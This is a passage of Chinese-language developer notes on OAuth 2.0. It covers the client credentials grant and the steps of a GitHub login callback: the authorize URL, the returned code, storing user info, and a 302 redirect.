上面 URL 中，grant_type参数等于client_credentials表示采用凭证式，client_id和client_secret用来让 B 确认 A 的身份。

第二步，B 网站验证通过以后，直接返回令牌。

这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。
**不管哪种授权方式，第三方应用申请令牌前，都必须到系统进行备案，说明自己的身份,然后拿到 两个识别码 (客户端ID [client ID]) 客户端秘钥(client secret)** 防止令牌被滥用，没有备案过的第三方应用，是不会拿到令牌的的
~~~

#### 使用第一种方式后redirect_uri的地址设置为

~~~js
https://github.com/login/oauth/authorize?client_id=${clientId}&redirect_uri=XXXX
xxxx代表为你自己后台设置的url接口地址
	一般为：/login/github/callback
	然后会有github返回的query数据 /login/github/callback?code=........
    然后获取用户信息
    将获取到的用户信息保存为文件uesrinfo.json或者存储到数据库中,页面重定向后再次请求这个userinfo.json的文件或者数据库信息
    注意使用重定向：res.writeHead(302,http.STATUS_CODE[302],{"Location":"获取到数据后重定向的地址"})
    
**页面在首次登陆的时候就会请求userinfo.json的文件或者数据库信息，大体的格式为
{}
~~~



